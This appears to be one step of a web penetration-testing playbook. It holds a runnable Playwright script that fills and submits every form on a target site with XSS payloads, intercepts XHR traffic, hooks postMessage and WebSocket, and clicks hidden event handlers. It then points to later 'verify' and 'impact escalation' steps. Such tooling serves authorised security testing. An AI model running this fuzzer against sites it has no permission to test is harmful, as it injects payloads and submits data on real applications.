# Modern Browser — Probe

## Purpose
Automated form interaction, input fuzzing with XSS payloads, network request interception, postMessage handler testing, WebSocket connection inspection, and event triggering on unlinked elements.

## Required Variables
- $TARGET_URL: target web application URL
- $OUTDIR: output directory
- $EVIDENCE_DIR: evidence directory

## Commands

### 02.1 — Form fuzzing, network interception, postMessage test
```bash
mkdir -p $OUTDIR/probe $EVIDENCE_DIR

python3 << 'PYEOF'
import asyncio, json, os
from datetime import datetime, timezone
from playwright.async_api import async_playwright

TARGET = os.environ["TARGET_URL"]
OUTDIR = os.environ["OUTDIR"]
EVDIR  = os.environ["EVIDENCE_DIR"]

XSS_PAYLOADS = [
    '<img src=x onerror=alert(1)>',
    '"><svg onload=alert(1)>',
    'javascript:alert(1)',
    '\'--><script>alert(1)</script>',
    '"><img src=x onerror=alert(document.domain)>',
]

async def run():
    ts = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
    fetch_log = []
    postmessage_log = []
    ws_log = []

    async with async_playwright() as pw:
        browser = await pw.chromium.launch(headless=True)
        context = await browser.new_context()
        page = await context.new_page()

        page.on("request", lambda req: fetch_log.append({
            "url": req.url, "method": req.method,
            "resource_type": req.resource_type,
            "headers": dict(req.headers)
        }) if req.resource_type in ("fetch","xhr") else None)

        await page.expose_function("__log_postmessage", lambda data: postmessage_log.append(json.loads(data)))
        await page.evaluate("""() => {
            window.addEventListener('message', (e) => {
                window.__log_postmessage(JSON.stringify({origin: e.origin, data: String(e.data).slice(0,200), source: e.source !== null}));
            });
        }""")

        ws_info = await page.evaluate("""() => {
            const orig = WebSocket.prototype.send;
            let count = 0;
            WebSocket.prototype.send = function(...a) { count++; return orig.apply(this, a); };
            return {websocket_constructor_exists: typeof WebSocket !== 'undefined'};
        }""")
        ws_log.append(ws_info)

        await page.goto(TARGET, wait_until="networkidle", timeout=30000)

        forms = await page.eval_on_selector_all("form", """els => els.map(f => ({
            action: f.action, method: f.method, id: f.id,
            inputs: [...f.querySelectorAll('input,textarea,select')].map(i => ({name:i.name, type:i.type||i.tagName.toLowerCase(), id:i.id}))
        }))""")

        form_results = []
        for fi, form in enumerate(forms):
            for pi, payload in enumerate(XSS_PAYLOADS):
                try:
                    inputs = form["inputs"]
                    for inp in inputs:
                        sel = f'[name="{inp["name"]}"]' if inp.get("name") else f'#{inp["id"]}' if inp.get("id") else None
                        if not sel: continue
                        if inp["type"] in ("text","search","url","email","textarea","",None):
                            await page.fill(sel, payload)
                        elif inp["type"] == "password":
                            await page.fill(sel, "Test123!")
                    form_results.append({"form_index": fi, "payload_index": pi, "payload": payload, "status": "filled"})
                    if form.get("id"):
                        submit_btn = await page.query_selector(f"form#{form['id']} [type=submit], form#{form['id']} button")
                    else:
                        submit_btn = await page.query_selector("form [type=submit], form button")
                    if submit_btn:
                        await submit_btn.click(timeout=3000)
                        form_results[-1]["submitted"] = True
                except Exception as ex:
                    form_results[-1]["error"] = str(ex)[:100]

        unlinked_interactions = []
        click_targets = await page.query_selector_all("[onclick], [onmousedown], [onmouseup], a:not([href])")
        for el in click_targets[:20]:
            try:
                await el.click(timeout=2000)
                unlinked_interactions.append({"tag": await el.evaluate("e => e.tagName"), "clicked": True})
            except: pass

        await page.screenshot(path=f"{EVDIR}/probe_{ts}.png", full_page=True)

        report = {
            "url": TARGET, "timestamp": ts,
            "forms_tested": len(forms), "form_results": form_results,
            "fetch_xhr_count": len(fetch_log), "fetch_xhr_log": fetch_log[:100],
            "postmessage_events": len(postmessage_log), "postmessage_log": postmessage_log,
            "websocket_log": ws_log,
            "unlinked_interactions": unlinked_interactions,
        }
        with open(f"{OUTDIR}/probe/fuzz_report.json", "w") as f:
            json.dump(report, f, indent=2)
        print(json.dumps(report, indent=2))
        await browser.close()

asyncio.run(run())
PYEOF
```

## Detection Signals
- `fetch_xhr_log` contains internal API paths → expanded attack surface
- `postmessage_events > 0` with wildcard origin (`*`) → cross-origin message hijack
- `form_results[*].submitted == true` → forms interactable, test for stored XSS/CSRF
- `websocket_constructor_exists == true` → real-time channel worth auditing
- `unlinked_interactions[*].clicked == true` → hidden event handlers triggered

## Next
├── If forms submitted successfully → run `03-verify.md` with reflected payloads
├── If postMessage with wildcard → escalate via `04-impact-escalation.md`
├── If no interactive elements → try navigating to discovered links from 01-discovery